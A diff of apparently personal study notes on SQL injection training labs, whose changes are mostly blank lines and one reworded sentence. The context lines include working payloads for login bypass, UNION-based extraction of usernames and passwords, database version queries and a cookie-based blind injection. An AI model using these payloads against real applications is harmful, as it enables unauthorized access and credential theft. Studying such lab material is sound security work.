@@ -12,6 +12,7 @@ SQL injection attack that causes the application to display one or more unreleas
 	.../filter?category= ' OR 1=1--
 ```
 
+
 ## 2. SQL injection vulnerability allowing login bypass
 
 SQL injection attack that logs in to the application as the `administrator` user.
@@ -19,6 +20,7 @@ SQL injection attack that logs in to the application as the `administrator` us
 ```
 .../my-account?id=administrator'--
 ```
+
 
 ## 3. SQL injection querying the database type and version on Oracle
 
@@ -31,6 +33,7 @@ SQL injection attack that logs in to the application as the `administrator` us
  'UNION SELECT 'a', banner FROM v$version--
 ```
 
+
 ## 4. SQL injection attack, querying the database type and version on MySQL and Microsoft
 
 In Microsoft database we can payload without to specify FROM table, instead we can comment with "#" right after selected columns:
@@ -42,6 +45,7 @@ In Microsoft database we can payload without to specify FROM table, instead we c
 ```
  'UNION SELECT 'a', @@version#
  ```
+
 
 ## 5. SQL injection attack, listing the database contents on non-Oracle databases
 
@@ -64,6 +68,7 @@ Replacing the table and column names to retrieve the usernames and passwords for
 ' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
 ```
 
+
 ## 6. SQL injection attack, listing the database contents on Oracle
 
 ```
@@ -81,6 +86,7 @@ Replacing the table and column names to retrieve the usernames and passwords for
 ```
 ' UNION SELECT USERNAME_LFECQG, PASSWORD_MSPEUR FROM USERS_EIEFAP--
 ```
+
 
 ## 7. SQL injection UNION attack, finding a column containing text
 
@@ -115,6 +121,7 @@ Replacing the table and column names to retrieve the usernames and passwords for
 ' UNION SELECT username, password FROM users--
 ```
 
+
 ## 9. SQL injection UNION attack, retrieving multiple values in a single column
 
 ```
@@ -135,6 +142,7 @@ In order to retrieve data we need to do that only on the second position using c
 
 			![[Pasted image 20240627154411.png]]
 			
+
 
 ## 10. Blind SQL injection with conditional responses(MYSQL)
 
@@ -243,7 +251,7 @@ We add comment characters to comment out the rest of the query, including the ex
 ```
 TrackingId=ogAZZfxtOKUELbuJ'--
 ```
-Confirm that you we longer receive an error (this suggests that the query is now syntactically valid).
+We longer receive an error (this suggests that the query is now syntactically valid).
 
 We will adapt the query to include a generic `SELECT` subquery and cast the returned value to an `int` data type.
 ```
